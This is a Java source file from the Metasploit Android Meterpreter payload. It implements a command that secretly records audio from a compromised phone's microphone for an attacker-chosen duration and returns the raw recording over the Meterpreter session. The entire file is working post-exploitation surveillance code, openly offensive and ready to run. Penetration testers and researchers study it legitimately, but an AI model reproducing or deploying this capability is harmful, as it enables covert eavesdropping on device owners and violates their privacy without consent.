
package com.metasploit.meterpreter.android;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.stdapi.webcam_audio_record;

import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder.AudioSource;
import android.util.Log;

public class webcam_audio_record_android extends webcam_audio_record implements Command {

    private static final int AUDIO_SAMPLE_RATE = 8000;
    private static final int AUDIO_CHANNEL_CONFIG = AudioFormat.CHANNEL_CONFIGURATION_MONO;
    private static final int AUDIO_CHANNEL_ENCODING = AudioFormat.ENCODING_PCM_16BIT;

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_AUDIO_DURATION = TLVPacket.TLV_META_TYPE_UINT | (TLV_EXTENSIONS + 1);
    private static final int TLV_TYPE_AUDIO_DATA = TLVPacket.TLV_META_TYPE_RAW | (TLV_EXTENSIONS + 2);

    public byte[] getAudioRecorder(int duration) {
        int bufferSize = AudioRecord.getMinBufferSize(AUDIO_SAMPLE_RATE, AUDIO_CHANNEL_CONFIG, AUDIO_CHANNEL_ENCODING);
        int fullBuffer = duration * AUDIO_SAMPLE_RATE;
        if (fullBuffer < bufferSize) {
            fullBuffer = bufferSize;
        }
        AudioRecord recorder = new AudioRecord(AudioSource.MIC, AUDIO_SAMPLE_RATE, AUDIO_CHANNEL_CONFIG, AUDIO_CHANNEL_ENCODING, fullBuffer);
        byte[] buffer = new byte[fullBuffer];

        try {
            recorder.startRecording();
            recorder.read(buffer, 0, buffer.length);
        } catch (Throwable x) {
            Log.e(webcam_audio_record_android.class.getSimpleName(), "Error reading voice audio ", x);
        } finally {
            recorder.stop();
            recorder.release();
        }
        return buffer;
    }

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        int duration = request.getIntValue(TLV_TYPE_AUDIO_DURATION);
        response.add(TLV_TYPE_AUDIO_DATA, getAudioRecorder(duration));
        return ERROR_SUCCESS;
    }
}
